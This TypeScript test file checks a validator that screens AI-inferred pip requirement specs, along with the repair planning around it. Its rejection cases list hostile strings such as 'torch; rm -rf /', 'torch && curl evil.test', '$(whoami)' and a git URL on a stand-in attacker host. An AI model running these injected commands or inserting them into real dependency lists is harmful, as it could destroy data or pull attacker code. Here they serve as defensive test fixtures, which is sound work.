import { mkdir, mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  MAX_PACKAGES,
  buildDependencyContext,
  parseDependencyPlan,
  validateRequirementSpec,
} from '../src/comparison/dep-inference.js';
import { planFix } from '../src/comparison/repair.js';

/**
 * Dependency inference for repositories with no requirements file. The agent
 * proposes; only the grammar decides what may reach pip.
 */

describe('validateRequirementSpec', () => {
  it('accepts ordinary requirement forms', () => {
    for (const spec of [
      'torch',
      'numpy>=1.21,<2',
      'pillow',
      'scikit-learn==1.3.2',
      'tqdm~=4.66',
      'torch[opt]>=1.13,<3',
      'opencv-python>=4.5.0,!=4.7.0.72',
    ]) {
      expect(validateRequirementSpec(spec), spec).toBe(true);
    }
  });

  it('rejects anything that could become a command, flag, path or URL', () => {
    for (const spec of [
      '-r secrets.txt',
      '--index-url http://evil.test',
      '-e .',
      'torch; rm -rf /',
      'torch;rm',
      'torch && curl evil.test',
      'torch|sh',
      '$(whoami)',
      'torch`id`',
      'torch>=1;echo',
      'https://evil.test/torch.zip',
      'torch@ git+https://evil.test',
      '../outside',
      'torch\nmalicious',
      // A bare clause is not a version comparator: `torch,rm` must not pass.
      'torch,rm',
      'torch,>=1,<2,;x',
      '',
      '  ',
    ]) {
      expect(validateRequirementSpec(spec), JSON.stringify(spec)).toBe(false);
    }
  });
});

describe('parseDependencyPlan', () => {
  it('drops unsafe specs with a visible reason instead of failing the plan', () => {
    const plan = parseDependencyPlan(
      JSON.stringify({
        packages: ['torch', 'rm -rf /', 'numpy>=1.21', '-e .'],
        notes: 'from README',
      }),
    );
    expect(plan.packages).toEqual(['torch', 'numpy>=1.21']);
    expect(plan.notes).toContain('rejected 2 unsafe spec(s)');
  });

  it('dedupes, caps at MAX_PACKAGES and refuses an empty result', () => {
    const many = Array.from({ length: 60 }, (_, i) => `pkg${i}`);
    expect(parseDependencyPlan(JSON.stringify({ packages: many })).packages.length).toBe(
      MAX_PACKAGES,
    );
    expect(
      parseDependencyPlan(JSON.stringify({ packages: ['torch', 'torch', ' torch '] })).packages,
    ).toEqual(['torch']);
    expect(() => parseDependencyPlan(JSON.stringify({ packages: ['-x', 'a b'] }))).toThrow(
      /no usable requirement specs/,
    );
    expect(() => parseDependencyPlan('{"packages": "torch"}')).toThrow(/packages array/);
    expect(() => parseDependencyPlan('not json')).toThrow(/not JSON/);
  });
});

describe('planFix with inference', () => {
  const failure = { kind: 'missing-dependency' as const, summary: "No module named 'torch'" };

  async function repo(withRequirements: boolean): Promise<string> {
    const dir = await mkdtemp(join(tmpdir(), 'ideaseek-depfix-'));
    await mkdir(join(dir, 'utils'), { recursive: true });
    await writeFile(join(dir, 'utils', 'training.py'), 'import torch\nimport numpy\n', 'utf8');
    await writeFile(join(dir, 'README.md'), '# RethinkFL\n\npip install torch\n', 'utf8');
    if (withRequirements) await writeFile(join(dir, 'requirements.txt'), 'torch\n', 'utf8');
    return dir;
  }

  it('uses the requirements file when present and never calls the model', async () => {
    let called = 0;
    const plan = await planFix(failure, await repo(true), {
      infer: async () => {
        called += 1;
        return { packages: ['torch'], notes: '' };
      },
    });
    expect(plan.kind).toBe('venv-install');
    expect(called).toBe(0);
  });

  it('infers when there is no requirements file', async () => {
    const plan = await planFix(failure, await repo(false), {
      infer: async () => ({ packages: ['torch', 'numpy'], notes: 'imports + README' }),
    });
    expect(plan.kind).toBe('venv-install-inferred');
    expect(plan.packages).toEqual(['torch', 'numpy']);
    expect(plan.detail).toContain('agent-inferred');
  });

  it('refuses to infer when network egress is off, and says which knob to turn', async () => {
    const plan = await planFix(failure, await repo(false), {
      allowNetworkInstall: false,
      infer: async () => ({ packages: ['torch'], notes: '' }),
    });
    expect(plan.kind).toBe('none');
    expect(plan.detail).toContain('allow_network');
  });

  it('keeps the existing-venv guard first, so a broken venv is not papered over', async () => {
    const dir = await repo(false);
    await mkdir(join(dir, '.venv'), { recursive: true });
    const plan = await planFix(failure, dir, {
      infer: async () => ({ packages: ['torch'], notes: '' }),
    });
    expect(plan.detail).toContain('venv already present');
  });

  it('says which piece is missing when there is neither a file nor a harness', async () => {
    const plan = await planFix(failure, await repo(false));
    expect(plan.kind).toBe('none');
    expect(plan.detail).toContain('no requirements file');
    expect(plan.detail).toContain('no harness configured');
  });

  it('classifies an internal package as a search-path problem, not a dependency', async () => {
    // `python utils/training.py` puts utils/ on sys.path, so the repo's own
    // `models` package looks like a missing module. pip would be wrong in kind.
    const dir = await repo(false);
    await mkdir(join(dir, 'models'), { recursive: true });
    await writeFile(join(dir, 'models', '__init__.py'), '', 'utf8');
    const plan = await planFix(
      { kind: 'missing-dependency', summary: "No module named 'models'", module: 'models' },
      dir,
      { infer: async () => ({ packages: ['models'], notes: 'should not be used' }) },
    );
    expect(plan.kind).toBe('pythonpath-root');
    expect(plan.packages).toBeUndefined();
    expect(plan.detail).toContain('exists inside the worktree');
    const keys = Object.keys(plan.env ?? {});
    expect(keys).toHaveLength(1);
    expect(keys[0].toUpperCase()).toBe('PYTHONPATH');
    expect(plan.env?.[keys[0]!]).toContain(dir);
  });

  it('still fixes an internal module when a venv already exists', async () => {
    // The ordering bug this guards: the venv check used to come first, so any
    // method that had already had dependencies installed could never reach the
    // PYTHONPATH fix — even though the two have nothing to do with each other.
    const dir = await repo(false);
    await mkdir(join(dir, '.venv'), { recursive: true });
    await mkdir(join(dir, 'models'), { recursive: true });
    await writeFile(join(dir, 'models', '__init__.py'), '', 'utf8');
    const plan = await planFix(
      { kind: 'missing-dependency', summary: "No module named 'models'", module: 'models' },
      dir,
      { infer: async () => ({ packages: ['x'], notes: '' }) },
    );
    expect(plan.kind).toBe('pythonpath-root');
  });

  it('keeps an external package on the pip path', async () => {
    const plan = await planFix(
      { kind: 'missing-dependency', summary: "No module named 'torch'", module: 'torch' },
      await repo(false),
      { infer: async () => ({ packages: ['torch'], notes: 'from imports' }) },
    );
    expect(plan.kind).toBe('venv-install-inferred');
  });

  it('resolves dotted internal modules by their package path', async () => {
    const dir = await repo(false);
    await mkdir(join(dir, 'models', 'net'), { recursive: true });
    await writeFile(join(dir, 'models', 'net', 'resnet.py'), '', 'utf8');
    const plan = await planFix(
      {
        kind: 'missing-dependency',
        summary: "No module named 'models.net.resnet'",
        module: 'models.net.resnet',
      },
      dir,
      { infer: async () => ({ packages: ['x'], notes: '' }) },
    );
    expect(plan.kind).toBe('pythonpath-root');
  });

  it('still blocks non-dependency failures without consulting the model', async () => {
    let called = 0;
    const plan = await planFix(
      { kind: 'syntax-error', summary: 'SyntaxError' },
      await repo(false),
      {
        infer: async () => {
          called += 1;
          return { packages: ['x'], notes: '' };
        },
      },
    );
    expect(plan.kind).toBe('none');
    expect(called).toBe(0);
  });
});

describe('buildDependencyContext', () => {
  it('assembles bounded evidence: traceback, packaging absence and import roots', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'ideaseek-depctx-'));
    await mkdir(join(dir, 'utils'), { recursive: true });
    await writeFile(
      join(dir, 'utils', 'training.py'),
      'import torch\nfrom PIL import Image\n',
      'utf8',
    );
    await writeFile(join(dir, 'main.py'), 'import numpy as np\nimport torchvision\n', 'utf8');
    await writeFile(join(dir, 'README.md'), 'pip install torch\n', 'utf8');

    const context = await buildDependencyContext(
      dir,
      ['python', 'utils/training.py'],
      'x'.repeat(9000),
    );
    expect(context).toContain('utils/training.py');
    expect(context).toContain('packaging files present\n(none)');
    expect(context).toContain('torch');
    expect(context).toContain('PIL');
    expect(context).toContain('numpy');
    expect(context).toContain('torchvision');
    // The traceback tail is bounded so a huge log cannot crowd out the rest.
    expect(context.length).toBeLessThanOrEqual(12_100);
  });
});
